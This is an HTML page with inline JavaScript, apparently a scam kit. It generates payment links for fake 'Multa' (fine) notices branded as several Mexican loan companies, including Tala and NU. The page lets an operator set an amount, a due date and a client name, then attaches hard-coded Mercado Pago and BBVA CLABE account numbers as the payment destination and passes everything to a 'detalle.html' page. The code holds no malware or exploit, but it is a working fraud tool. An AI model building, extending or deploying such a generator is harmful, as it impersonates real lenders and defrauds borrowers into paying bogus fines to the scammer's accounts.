<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Generador</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
        body { font-family: 'Inter', sans-serif; background: #0b1120 url('https://consulta-multasapp.vercel.app/_next/static/media/bg-desktop.8463878b.jpg') no-repeat center center fixed; background-size: cover; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .app-card { width: 100%; max-width: 440px; background: white; border-radius: 2.5rem; overflow: hidden; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
        .input-monto::-webkit-inner-spin-button { display: none; }
        
        /* PARCHE DE VISIBILIDAD PARA EL SELECTOR */
        #prod { background-color: white !important; color: black !important; appearance: auto !important; -webkit-appearance: listbox !important; }
        #prod option { background-color: white !important; color: black !important; }
    </style>
</head>
<body>
    <div class="app-card">
        <div id="header-bg" class="bg-[#14b8a6] pt-10 pb-4 text-center">
            <div class="w-20 h-20 bg-white rounded-3xl mx-auto mb-4 flex items-center justify-center overflow-hidden border-4 border-white/20">
                <img src="https://i.ibb.co/qF6Vvqy/tala-te-presta.png" class="w-full h-full object-cover">
            </div>
            <div class="px-8 mb-4">
                <select id="prod" onchange="updateUI()" class="w-full border-none rounded-xl px-4 py-2 font-bold text-center outline-none">
                    <option value="tala|#14b8a6|#0d9488">Tala Préstamos</option>
                    <option value="nu|#820ad1|#581c87">Préstamos NU</option>
                    <option value="dida|#2563eb|#1d4ed8">DidaPréstamos</option>
                    <option value="rapidos|#10b981|#059669">Préstamos rápidos</option>
                    <option value="worldmox|#6366f1|#4f46e5">WorldmoxPro GG</option>
                    <option value="talacred|#06b6d4|#0891b2">Tala Crédito</option>
                    <option value="movil|#f59e0b|#d97706">Movil Cash</option>
                    <option value="dinero|#ec4899|#db2777">Préstamos de Dinero</option>
                    <option value="prestamos|#64748b|#475569">Préstamos</option>
                </select>
            </div>
            <div id="monto-bg" class="bg-[#0d9488] mx-6 p-6 rounded-[1.5rem] text-left text-white">
                <span class="text-[10px] font-bold opacity-70 uppercase">Monto de Pago</span>
                <div class="flex items-center text-4xl font-black">
                    <span>$</span>
                    <input type="number" id="monto" value="0.00" step="0.01" class="input-monto bg-transparent border-none outline-none w-full text-white ml-1">
                </div>
            </div>
        </div>

        <div class="p-6 space-y-4 text-sm font-bold text-slate-800">
            <div class="flex justify-between border-b pb-2"><span class="text-gray-400 uppercase text-[10px]">Subproducto</span><span>Multa</span></div>
            <div class="flex justify-between border-b pb-2"><span class="text-gray-400 uppercase text-[10px]">Importe</span><span id="l-monto">$0.00</span></div>
            <div class="flex justify-between border-b pb-2">
                <span class="text-gray-400 uppercase text-[10px]">Fecha Vencimiento</span>
                <input type="date" id="fecha" onchange="calcDias()" class="outline-none text-right font-bold">
            </div>
            <div class="flex justify-between border-b pb-2">
                <span class="text-gray-400 uppercase text-[10px]">Días Vencimiento</span>
                <span id="l-dias">0</span>
            </div>

            <div class="bg-gray-50 rounded-[2rem] p-6 text-center space-y-3 border border-gray-100">
                <span class="text-[10px] text-gray-400 uppercase">Método de Pago</span>
                <select id="metodo" onchange="cambiarCuenta()" class="w-full border rounded-xl p-2 text-center outline-none bg-white">
                    <option value="MERCADO PAGO W SPEI">MERCADO PAGO W SPEI</option>
                    <option value="BBVA">BBVA</option>
                </select>
                <span class="text-[10px] text-gray-400 uppercase">Liga de Pago</span>
                <select id="clabe" class="w-full border rounded-xl p-2 text-center text-blue-600 outline-none bg-white">
                    <option value="703010052250010635">703010052250010635</option>
                </select>
            </div>

            <input type="text" id="nom" placeholder="Nombre del cliente" class="w-full border-b py-2 text-center outline-none uppercase">
            <button onclick="generar()" id="btn" class="w-full bg-[#0d9488] text-white py-4 rounded-2xl font-black uppercase tracking-widest text-xs">GENERAR LINK</button>
        </div>
    </div>

    <script>
        document.getElementById('fecha').valueAsDate = new Date();
        document.getElementById('monto').addEventListener('input', (e) => { document.getElementById('l-monto').innerText = '$' + (e.target.value || "0.00"); });

        function calcDias() {
            const f = new Date(document.getElementById('fecha').value);
            const hoy = new Date();
            hoy.setHours(0,0,0,0); f.setHours(0,0,0,0);
            const diff = Math.ceil((hoy - f) / (1000 * 60 * 60 * 24));
            const el = document.getElementById('l-dias');
            el.innerText = diff > 0 ? diff : 0;
            el.style.color = diff > 0 ? "#ef4444" : "#1e293b"; 
        }

        function cambiarCuenta() {
            const m = document.getElementById('metodo').value;
            const c = document.getElementById('clabe');
            c.innerHTML = "";
            let n = (m === "BBVA") ? "012180015094579916" : "703010052250010635";
            c.add(new Option(n, n));
        }

        function updateUI() {
            const [id, c1, c2] = document.getElementById('prod').value.split('|');
            document.getElementById('header-bg').style.backgroundColor = c1;
            document.getElementById('monto-bg').style.backgroundColor = c2;
            document.getElementById('btn').style.backgroundColor = c2;
        }

        function generar() {
            const p = new URLSearchParams({
                m: document.getElementById('monto').value,
                n: document.getElementById('nom').value || "Cliente",
                f: document.getElementById('fecha').value,
                pr: document.getElementById('prod').options[document.getElementById('prod').selectedIndex].text,
                cl: document.getElementById('clabe').value,
                b: document.getElementById('metodo').value,
                s: Date.now()
            });
            window.location.href = `detalle.html?${p.toString()}`;
        }
    </script>
</body>
</html>
